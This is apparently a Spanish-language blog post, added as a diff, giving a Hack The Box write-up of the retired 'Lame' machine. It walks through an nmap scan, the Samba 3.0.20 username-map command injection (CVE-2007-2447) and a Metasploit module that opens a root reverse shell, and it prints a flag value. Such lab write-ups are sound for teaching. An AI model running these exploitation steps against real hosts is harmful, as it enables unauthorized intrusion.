@@ -1,0 +1,100 @@
+---
+title: "HTB: Lame — Write-Up"
+description: "Explotación de Samba 3.0.20 (CVE-2007-2447) para RCE directo a root en la máquina retirada Lame de Hack The Box."
+pubDate: 2026-06-15
+category: writeup
+platform: HTB
+difficulty: easy
+os: linux
+tags: ["samba", "cve-2007-2447", "metasploit", "enumeration", "linux"]
+draft: false
+---
+
+Lame es una de las máquinas más antiguas y clásicas de Hack The Box. Es un
+excelente punto de partida para entender el flujo básico de un pentest: **enumerar,
+identificar el servicio vulnerable y explotarlo**. En este caso, un Samba
+desactualizado nos da ejecución de comandos directamente como `root`.
+
+<Callout type="info" title="Objetivo">
+Obtener las flags <code>user.txt</code> y <code>root.txt</code> de la máquina 10.10.10.3.
+</Callout>
+
+## Reconocimiento
+
+Empezamos con un escaneo completo de puertos con `nmap` para ver qué corre en la máquina.
+
+```bash
+nmap -sC -sV -p- --min-rate 5000 10.10.10.3 -oN scan.txt
+```
+
+El escaneo revela varios servicios interesantes:
+
+```ansi
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
+```
+
+El puerto **445** nos delata la versión exacta: `Samba 3.0.20`. Esta versión es
+vulnerable a **CVE-2007-2447** (Username Map Script Command Injection).
+
+## La vulnerabilidad
+
+`Samba 3.0.20` permite inyección de comandos a través del campo de nombre de
+usuario cuando la opción `username map script` está habilitada. Si enviamos un
+nombre de usuario con la sintaxis `` `/comando/` ``, Samba lo ejecuta en el sistema.
+
+<Callout type="warn" title="Contexto">
+Este es un CVE de 2007. En un entorno real, un servicio así de desactualizado
+indica falta total de mantenimiento — casi nunca es la única vulnerabilidad presente.
+</Callout>
+
+## Explotación
+
+La forma más rápida es con Metasploit, que tiene un módulo dedicado:
+
+```bash
+msfconsole -q
+use exploit/multi/samba/usermap_script
+set RHOSTS 10.10.10.3
+set LHOST tun0
+run
+```
+
+En segundos obtenemos una shell. Verificamos con qué usuario estamos ejecutando:
+
+<Terminal user="root" host="lame" path="/" cmd="id">
+uid=0(root) gid=0(root)
+</Terminal>
+
+Somos **root** directamente: Samba corría con privilegios elevados, así que no hace
+falta escalada de privilegios.
+
+## Post-explotación
+
+Con la shell de root, capturamos ambas flags:
+
+```bash
+cat /home/makis/user.txt
+cat /root/root.txt
+```
+
+La flag de usuario luce así (haz click para revelarla):
+
+<Flag label="user.txt">69454a4c5bcd7e4e6a5c3b2d1f0e9a8b</Flag>
+
+<Callout type="pwned" title="Máquina comprometida">
+Root obtenido sin escalada de privilegios. Un único servicio desactualizado
+comprometió todo el sistema.
+</Callout>
+
+## Conclusión
+
+Lame demuestra por qué **mantener el software actualizado es la primera línea de
+defensa**. Lecciones clave:
+
+- La enumeración de versiones es el paso más valioso del reconocimiento.
+- Un CVE conocido + un servicio expuesto = compromiso total.
+- Siempre verifica los privilegios del servicio que explotas (aquí, Samba como root).
